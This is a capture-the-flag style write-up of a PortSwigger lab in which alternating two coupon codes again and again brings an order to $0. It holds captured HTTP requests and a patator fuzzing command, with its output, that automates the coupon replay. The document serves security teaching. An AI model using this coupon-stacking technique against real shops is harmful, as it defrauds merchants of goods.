# [Lab 9: Flawed enforcement of business rules](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)

---

## Description

This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

### Site Map

- `/`
	- Home page with card links to products
- `/product?productId=$PRODUCT_ID`
	- `GET`
		- Product page
	- `POST`
		- [Add product to cart](09%20-%20Flawed%20enforcement%20of%20business%20rules.md#^d0c194)
- `/my-account`
	- When unauthenticated, redirects to `/login`
	- When authenticated, the account page of the current user
		- Update email address feature is here
- `/cart`
	- `GET`: [Current user's shopping cart](09%20-%20Flawed%20enforcement%20of%20business%20rules.md#^879d9b)
- `/cart/coupon`
	- `POST`: [Apply coupon code](09%20-%20Flawed%20enforcement%20of%20business%20rules.md#^54beea)
- `/cart/checkout`
	- `POST`: [Place order](09%20-%20Flawed%20enforcement%20of%20business%20rules.md#^047059)
- `/cart/order-confirmation?order-confirmed=true`
	- `GET`: Redirected to after successfully placing an order. Renders the user's cart with the string `Your order is on its way!`.
- `/login`
	- `GET`
		- Login form
	- `POST`
		- [Submit login form](09%20-%20Flawed%20enforcement%20of%20business%20rules.md#^025b56)
- `/sign-up`
	- `POST`
		- [Sign up for the application's newsletter](09%20-%20Flawed%20enforcement%20of%20business%20rules.md#^cfa32b), which grants another coupon code: `SIGNUP30` which gives %30 off the order


### Authentication Workflow

Submit login request:

```http
POST /login HTTP/1.1
Host: acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Cookie: session=HmoFSk9B1dqSTztCzCY62XfuANsOMjIB
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Dnt: 1
Referer: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=WS0RTe0qpFHiRJguHbvYkroDSKJFV9TX&username=wiener&password=peter
```

^025b56

Successful authentication yields a 302 redirect to `/my-account` and grants a new `session` cookie, which is used through the shopping workflow to track user actions.

### Newsletter Signup

At the bottom of the home page is an input form to sign up for the application's newsletter.

Inputting an email address and submitting the form yields another coupon code: `SIGNUP30`. This code gives 30% off the total price.

```http
POST /sign-up HTTP/1.1
Host: ac771f321fc414ac803f39af00e3003d.web-security-academy.net
Cookie: session=tEKaMiJ5TysYulvlnoBDcvDkfLZvRvYY
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: https://ac771f321fc414ac803f39af00e3003d.web-security-academy.net
Dnt: 1
Referer: https://ac771f321fc414ac803f39af00e3003d.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=797ba3sH5UYf4H35Y7bQ5renrF9lw2Kb&email%2F=tgihf%40tgihf.click
```

^cfa32b

![](images/Pasted%20image%2020210829211509.png)

### Shopping Workflow

The challenge description indicates the application has a vulnerability in its purchasing workflow. Step through this workflow to understand how it works.

At the top of the home page (`/`), a banner indicates a discount code for new customers: `NEWCUST5`.

![](images/Pasted%20image%2020210829180425.png)

While authenticated, navigate to the cheapest product's page and add it to the cart.

```http
POST /cart HTTP/1.1
Host: acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Cookie: session=fcdfI5Jc5BcXucJLwXjjjDDbUYVD63ou
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Dnt: 1
Referer: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net/product?productId=9
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

productId=9&redir=PRODUCT&quantity=1
```

^d0c194

Navigate to the cart:

```http
GET /cart HTTP/1.1
Host: acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Cookie: session=fcdfI5Jc5BcXucJLwXjjjDDbUYVD63ou
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net/product?productId=9
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

^879d9b

Apply the coupon code `NEWCUST5`:

```http
POST /cart/coupon HTTP/1.1
Host: acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Cookie: session=fcdfI5Jc5BcXucJLwXjjjDDbUYVD63ou
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Dnt: 1
Referer: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=sYE4omgHCdxhCxb2kP6baBjStyYDf9aJ&coupon=NEWCUST5
```

^54beea

Upon submission of a valid coupon code, the application returns a 302 redirect to `/cart`. It appears the coupon code grants a fixed $5 off the total price of the purchase.

![](images/Pasted%20image%2020210829181156.png)

If the user submits an invalid coupon code, the application returns a 302 redirect to `/cart` and renders the error message `Invalid coupon` on the page.

If the user attempts to submit the same valid coupon code more than once in a row, the application returns a 302 redirect to `/cart` and renders the error message `Coupon already applied`. However, a user can enter the same coupon code more than once as long as it is not entered back-to-back. Thus, by entering the codes in the order `NEWCUST5`, `SIGNUP30`, and `NEWCUST5`, the `NEWCUST5` code will be applied to the order twice.

Place the order:

```http
POST /cart/checkout HTTP/1.1
Host: acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Cookie: session=fcdfI5Jc5BcXucJLwXjjjDDbUYVD63ou
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Dnt: 1
Referer: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

csrf=sYE4omgHCdxhCxb2kP6baBjStyYDf9aJ
```

^047059

If the order is placed successfully, the application redirects to `/cart/order-confirmation?order-confirmed=true`.

```http
GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
Host: acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net
Cookie: session=fcdfI5Jc5BcXucJLwXjjjDDbUYVD63ou
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acb71fa81e9c37a580a46c09009d00a2.web-security-academy.net/cart
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

![](images/Pasted%20image%2020210829181610.png)

If the user does not have sufficient funds to make the purchase, the application responds with a 303 redirect to `/cart?err=INSUFFICIENT_FUNDS`.

### Reusing Coupon Codes

This application allows the user to apply the same coupon code to their order an arbitrary number of times as long as the same coupon code isn't applied back to back. Automate the process of applying the `NEWCUST5` and `SIGNUP30` coupon codes until it is possible to purchase the l33t leather jacket. Since each application of both coupon codes removes $406.10 from the total price and the total price of the jacket is $1337, four iterations will do the trick.

```bash
$ echo "NEWCUST5" > coupon-codes.txt
$ echo "SIGNUP30" >> coupon-codes.txt
$ patator http_fuzz url='https://ac771f321fc414ac803f39af00e3003d.web-security-academy.net/cart/coupon' method=POST header='Cookie: session=tEKaMiJ5TysYulvlnoBDcvDkfLZvRvYY' body='csrf=797ba3sH5UYf4H35Y7bQ5renrF9lw2Kb&coupon=FILE1&iteration=RANGE0' 0=int:1-4 1=coupon-codes.txt -t 1

20:32:50 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-29 20:32 CDT
20:32:50 patator    INFO -
20:32:50 patator    INFO - code size:clen       time | candidate                          |   num | mesg
20:32:50 patator    INFO - -----------------------------------------------------------------------------
20:32:50 patator    INFO - 302  77:0           0.128 | 1:NEWCUST5                         |     1 | HTTP/1.1 302 Found
20:32:51 patator    INFO - 302  77:0           0.129 | 1:SIGNUP30                         |     2 | HTTP/1.1 302 Found
20:32:52 patator    INFO - 302  77:0           0.123 | 2:NEWCUST5                         |     3 | HTTP/1.1 302 Found
20:32:52 patator    INFO - 302  77:0           0.125 | 2:SIGNUP30                         |     4 | HTTP/1.1 302 Found
20:32:53 patator    INFO - 302  77:0           0.125 | 3:NEWCUST5                         |     5 | HTTP/1.1 302 Found
20:32:53 patator    INFO - 302  77:0           0.130 | 3:SIGNUP30                         |     6 | HTTP/1.1 302 Found
20:32:54 patator    INFO - 302  77:0           0.127 | 4:NEWCUST5                         |     7 | HTTP/1.1 302 Found
20:32:54 patator    INFO - 302  77:0           0.129 | 4:SIGNUP30                         |     8 | HTTP/1.1 302 Found
20:32:55 patator    INFO - Hits/Done/Skip/Fail/Size: 8/8/0/0/8, Avg: 1 r/s, Time: 0h 0m 5s
```

This brings the total to $0!

![](images/Pasted%20image%2020210829213416.png)

Place the order to complete the challenge.
